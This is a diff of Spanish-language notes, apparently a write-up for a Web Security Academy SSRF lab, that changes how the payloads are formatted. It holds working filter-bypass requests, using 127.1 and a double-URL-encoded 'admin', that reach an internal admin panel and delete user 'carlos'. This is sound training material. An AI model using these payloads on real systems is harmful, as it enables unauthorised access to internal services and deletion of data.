@@ -34,17 +34,16 @@ Todas apuntan al loopback; la blacklist solo conoce las obvias:
 > Para la **palabra filtrada** (`admin`): **doble URL-encode** una letra → `a` = `%2561` → `%2561dmin`. Si aún filtra, seguí encodeando.
 
 ## Cómo explotarlo
-```http
-POST /product/stock HTTP/1.1
-Host: LAB.web-security-academy.net
+
+> 🟡 <mark>Resaltado</mark> = lo que reemplazás vos (target/collab/IP) + el **payload** del ataque (URL interna / Referer / User-Agent).
+
+<pre class="payload"><code>POST /product/stock HTTP/1.1
+Host: <mark>LAB.web-security-academy.net</mark>
 Content-Type: application/x-www-form-urlencoded
 
-stockApi=http://127.1/%2561dmin
-```
+stockApi=<mark>http://127.1/%2561dmin</mark></code></pre>
 Confirmado el panel:
-```http
-stockApi=http://127.1/%2561dmin/delete?username=carlos
-```
+<pre class="payload"><code>stockApi=<mark>http://127.1/%2561dmin/delete?username=carlos</mark></code></pre>
 
 ## Verificación
 Con `localhost` da error de filtro; con `127.1` + `%2561dmin` **vuelve el panel** → carlos borrado.
